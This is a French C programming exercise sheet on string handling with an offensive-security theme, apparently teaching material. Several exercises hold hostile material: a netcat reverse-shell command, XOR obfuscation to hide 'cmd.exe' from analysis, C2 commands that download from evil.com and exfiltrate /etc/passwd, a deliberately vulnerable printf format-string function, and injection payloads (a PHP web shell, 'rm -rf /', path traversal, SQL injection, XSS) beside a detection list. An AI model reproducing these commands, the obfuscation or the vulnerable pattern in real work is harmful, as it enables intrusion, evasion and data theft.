# Exercices - Module 08 : Strings (Chaînes de caractères)

## Exercice 1 : Manipulation de base (Très facile)

**Objectif** : Maîtriser les opérations de base sur les strings.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char text[] = "Offensive Security";

    // TODO:
    // 1. Affiche la string
    // 2. Affiche sa longueur (strlen)
    // 3. Affiche sizeof(text) et explique la différence
    // 4. Affiche chaque caractère avec son index et code ASCII

    return 0;
}
```

---

## Exercice 2 : Copie et concaténation (Facile)

**Objectif** : Utiliser strcpy, strncpy, strcat, strncat.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char src[] = "Payload";
    char dst[50];
    char prefix[50] = "Encoded_";

    // TODO:
    // 1. Copie src dans dst avec strcpy, affiche
    // 2. Copie src dans un buffer de 5 bytes avec strncpy (attention!)
    // 3. Concatène src à prefix avec strcat
    // 4. Affiche tous les résultats

    return 0;
}
```

---

## Exercice 3 : Comparaison de strings (Facile)

**Objectif** : Comparer des strings avec strcmp et strncmp.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char password_db[] = "admin123";
    char attempts[][20] = {"admin", "admin123", "Admin123", "ADMIN123"};
    int num_attempts = 4;

    // TODO:
    // 1. Pour chaque tentative, compare avec le mot de passe
    // 2. Affiche si c'est correct ou incorrect
    // 3. Explique pourquoi "Admin123" != "admin123"
    // 4. BONUS: Implémente une comparaison case-insensitive

    return 0;
}
```

---

## Exercice 4 : Recherche dans les strings (Facile)

**Objectif** : Utiliser strchr et strstr pour la recherche.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char url[] = "https://admin:password123@target.com:8080/admin/login?user=root";

    // TODO:
    // 1. Trouve la position du premier ':' (après https)
    // 2. Trouve la position de '@' pour extraire les credentials
    // 3. Cherche si "admin" est présent dans l'URL
    // 4. Cherche si "/login" est présent
    // 5. Extrais et affiche: protocole, user, password, host, port, path

    return 0;
}
```

---

## Exercice 5 : ROT13 encoder (Moyen)

**Objectif** : Implémenter l'encodage ROT13.

### Instructions

```c
#include <stdio.h>
#include <string.h>

// TODO:
// 1. Crée une fonction rot13 qui encode/décode un string
// 2. ROT13 : chaque lettre est décalée de 13 positions
//    'A' -> 'N', 'B' -> 'O', ..., 'Z' -> 'M'
//    'a' -> 'n', 'b' -> 'o', ..., 'z' -> 'm'
// 3. Les caractères non-alphabétiques restent inchangés

int main(void) {
    char message[] = "Attack at midnight";

    printf("Original: %s\n", message);

    // TODO: Encode
    // Affiche: "Nggnpx ng zvqavtug"

    // TODO: Decode (rot13 à nouveau)
    // Affiche: "Attack at midnight"

    return 0;
}
```

---

## Exercice 6 : XOR string encoder (Moyen)

**Objectif** : Encoder une string avec XOR.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char secret[] = "C2_SERVER_192.168.1.100";
    int len = strlen(secret);
    unsigned char key = 0x42;

    // TODO:
    // 1. Affiche la string originale
    // 2. Encode avec XOR et affiche en hex
    // 3. Décode et vérifie que c'est identique
    // 4. BONUS: Génère du code C pour le payload encodé:
    //    unsigned char encoded[] = {0xXX, 0xXX, ...};

    return 0;
}
```

---

## Exercice 7 : String obfuscation (Moyen)

**Objectif** : Cacher des strings sensibles dans le binaire.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    // Ces strings seraient visibles avec 'strings' sur le binaire
    // char cmd[] = "cmd.exe";
    // char arg[] = "/c whoami";

    // TODO:
    // 1. Crée une fonction qui décode une string encodée
    // 2. Stocke "cmd.exe" encodé en XOR avec clé 0x55
    // 3. Stocke "/c whoami" encodé de la même façon
    // 4. Décode à l'exécution
    // 5. Affiche les strings décodées

    // Encoded data (calculé à l'avance):
    // 'c'^0x55 = 0x36, 'm'^0x55 = 0x38, 'd'^0x55 = 0x31, etc.

    return 0;
}
```

---

## Exercice 8 : Parser HTTP request (Moyen)

**Objectif** : Parser une requête HTTP.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char request[] = "POST /api/login HTTP/1.1\r\n"
                     "Host: target.com\r\n"
                     "Content-Type: application/json\r\n"
                     "Content-Length: 45\r\n"
                     "\r\n"
                     "{\"username\":\"admin\",\"password\":\"secret\"}";

    // TODO:
    // 1. Extrais la méthode (POST)
    // 2. Extrais le path (/api/login)
    // 3. Extrais la version HTTP (HTTP/1.1)
    // 4. Extrais le Host header
    // 5. Extrais le body JSON
    // 6. Affiche toutes ces informations

    return 0;
}
```

---

## Exercice 9 : Validation d'input (Moyen)

**Objectif** : Détecter les tentatives d'injection.

### Instructions

```c
#include <stdio.h>
#include <string.h>

// Patterns dangereux à détecter
const char *dangerous[] = {
    "<?php", "<%", "$(", "`", "&&", "||", ";",
    "../", "..\\", "<script", "javascript:",
    "SELECT", "INSERT", "DELETE", "DROP", "UNION"
};
int num_dangerous = 15;

int main(void) {
    char inputs[][100] = {
        "Hello World",
        "<?php system($_GET['cmd']); ?>",
        "; rm -rf /",
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "Normal text here",
        "<script>alert('XSS')</script>"
    };
    int num_inputs = 7;

    // TODO:
    // 1. Pour chaque input, vérifie s'il contient un pattern dangereux
    // 2. Affiche [SAFE] ou [DANGEROUS: pattern trouvé]
    // 3. Compte le nombre d'inputs dangereux

    return 0;
}
```

---

## Exercice 10 : Base64 simple (Challenge)

**Objectif** : Comprendre le fonctionnement de Base64.

### Instructions

```c
#include <stdio.h>
#include <string.h>

const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// TODO:
// 1. Implémente base64_encode qui encode une string
//    - Prend 3 bytes, produit 4 caractères
//    - Utilise le padding '=' si nécessaire
// 2. Teste avec "Hello" -> "SGVsbG8="
// 3. Teste avec "Man" -> "TWFu"

int main(void) {
    char input[] = "Attack";
    char encoded[100] = {0};

    printf("Input: %s\n", input);
    // TODO: Encode en base64
    printf("Base64: %s\n", encoded);

    return 0;
}
```

---

## Exercice 11 : Format string exploitation (Challenge)

**Objectif** : Comprendre les vulnérabilités format string.

### Instructions

```c
#include <stdio.h>
#include <string.h>

// NOTE: Ceci est pour l'éducation uniquement!
// Ne jamais écrire du code vulnérable en production.

void vulnerable_log(char *message) {
    // VULNÉRABLE - NE PAS FAIRE EN PRODUCTION
    printf(message);
    printf("\n");
}

void safe_log(char *message) {
    // SÉCURISÉ
    printf("%s\n", message);
}

int main(void) {
    int secret = 0xDEADBEEF;

    // TODO:
    // 1. Appelle vulnerable_log avec "Hello World" - normal
    // 2. Appelle vulnerable_log avec "%x %x %x %x" - que se passe-t-il?
    // 3. Appelle safe_log avec "%x %x %x %x" - que se passe-t-il?
    // 4. Explique la différence et le danger

    printf("[*] Adresse de secret: %p\n", (void*)&secret);

    // TODO: Teste les deux fonctions
    char input1[] = "Hello World";
    char input2[] = "%x %x %x %x";

    return 0;
}
```

---

## Exercice 12 : Shellcode string builder (Challenge)

**Objectif** : Construire dynamiquement une commande.

### Instructions

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char target_ip[] = "192.168.1.100";
    int target_port = 4444;

    char command[256];

    // TODO:
    // 1. Construis la commande: "nc 192.168.1.100 4444 -e /bin/sh"
    //    en utilisant snprintf de façon sécurisée
    // 2. Vérifie que le buffer n'overflow pas
    // 3. Affiche la commande construite
    // 4. BONUS: Encode la commande en base64

    return 0;
}
```

---

## Exercice 13 : Password generator (Challenge)

**Objectif** : Générer des mots de passe aléatoires.

### Instructions

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

int main(void) {
    char lowercase[] = "abcdefghijklmnopqrstuvwxyz";
    char uppercase[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char digits[] = "0123456789";
    char special[] = "!@#$%^&*()_+-=[]{}|;:,.<>?";

    char all_chars[100];
    char password[17];  // 16 chars + null

    // TODO:
    // 1. Combine tous les charset dans all_chars
    // 2. Génère un mot de passe de 16 caractères aléatoires
    // 3. Vérifie qu'il contient au moins:
    //    - 1 minuscule
    //    - 1 majuscule
    //    - 1 chiffre
    //    - 1 caractère spécial
    // 4. Affiche le mot de passe généré

    srand(time(NULL));

    return 0;
}
```

---

## Exercice 14 : C2 command encoder (Challenge)

**Objectif** : Encoder des commandes C2.

### Instructions

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct {
    int id;
    char command[100];
    char args[200];
} C2Command;

int main(void) {
    C2Command cmds[] = {
        {1, "whoami", ""},
        {2, "download", "http://evil.com/payload.exe"},
        {3, "execute", "calc.exe"},
        {4, "screenshot", "desktop.png"},
        {5, "exfil", "/etc/passwd"}
    };
    int num_cmds = 5;

    // TODO:
    // 1. Pour chaque commande, crée un format: "ID|COMMAND|ARGS"
    // 2. Encode le résultat en XOR avec clé 0xAA
    // 3. Affiche en hex
    // 4. Crée une fonction qui décode et parse
    // 5. Vérifie que le decode donne l'original

    return 0;
}
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifie que tu sais :

- [ ] Déclarer et initialiser des strings
- [ ] Utiliser strlen, strcpy, strcat, strcmp
- [ ] Rechercher avec strchr et strstr
- [ ] Implémenter ROT13 et XOR encoding
- [ ] Obfusquer des strings sensibles
- [ ] Parser des strings complexes (HTTP, URLs)
- [ ] Détecter des patterns dangereux
- [ ] Comprendre les vulnérabilités format string
- [ ] Construire des commandes dynamiquement
- [ ] Encoder des données pour C2

---

## Solutions

Voir [solution.md](solution.md) pour les solutions commentées.
